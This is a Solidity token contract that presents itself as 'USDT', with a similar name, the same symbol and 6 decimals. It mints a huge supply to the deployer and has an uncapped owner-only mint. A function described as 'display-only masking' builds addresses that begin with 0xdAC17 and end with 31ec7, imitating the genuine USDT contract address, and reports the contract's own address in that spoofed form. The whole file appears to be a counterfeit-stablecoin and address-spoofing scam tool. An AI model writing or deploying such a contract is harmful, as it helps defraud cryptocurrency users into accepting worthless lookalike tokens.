// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract UniversalStableDollarToken {

    string public constant name = "Universal Stable Dollar Token";
    string public constant symbol = "USDT";
    uint8 public constant decimals = 6;

    uint256 public constant INITIAL_SUPPLY =
        900_000_000_000_000 * (10 ** uint256(decimals));

    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;

    event Transfer(
        address indexed from,
        address indexed to,
        uint256 value
    );

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;

        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;

        emit Transfer(
            address(0),
            msg.sender,
            INITIAL_SUPPLY
        );
    }

    function balanceOf(
        address account
    ) public view returns (uint256) {
        return balances[account];
    }

    function allowance(
        address tokenOwner,
        address spender
    ) public view returns (uint256) {
        return allowances[tokenOwner][spender];
    }

    function transfer(
        address to,
        uint256 amount
    ) public returns (bool) {
        require(
            balances[msg.sender] >= amount,
            "Insufficient balance"
        );

        balances[msg.sender] -= amount;
        balances[to] += amount;

        emit Transfer(
            msg.sender,
            to,
            amount
        );

        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public returns (bool) {
        allowances[msg.sender][spender] = amount;

        emit Approval(
            msg.sender,
            spender,
            amount
        );

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(
            balances[from] >= amount,
            "Insufficient balance"
        );

        require(
            allowances[from][msg.sender] >= amount,
            "Allowance exceeded"
        );

        allowances[from][msg.sender] -= amount;

        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(
            from,
            to,
            amount
        );

        return true;
    }

    function mint(
        address to,
        uint256 amount
    ) external onlyOwner {

        uint256 mintAmount =
            amount * (10 ** uint256(decimals));

        totalSupply += mintAmount;
        balances[to] += mintAmount;

        emit Transfer(
            address(0),
            to,
            mintAmount
        );
    }

    function burn(
        uint256 amount
    ) external {

        require(
            balances[msg.sender] >= amount,
            "Insufficient balance"
        );

        balances[msg.sender] -= amount;
        totalSupply -= amount;

        emit Transfer(
            msg.sender,
            address(0),
            amount
        );
    }

    // Display-only masking utility
    // Produces a derived address pattern
    // similar to:
    // 0xdAC17xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx31ec7

    function maskedDisplayAddress(
        address source
    )
        public
        pure
        returns(address)
    {
        uint160 prefix =
            uint160(0xdAC17) << 140;

        uint160 suffix =
            uint160(0x31ec7);

        uint160 middleMask =
            ((uint160(1) << 120) - 1) << 20;

        uint160 result =
            prefix |
            (uint160(source) & middleMask) |
            suffix;

        return address(result);
    }

    function getMaskedContractAddress()
        external
        view
        returns(address)
    {
        return maskedDisplayAddress(
            address(this)
        );
    }
}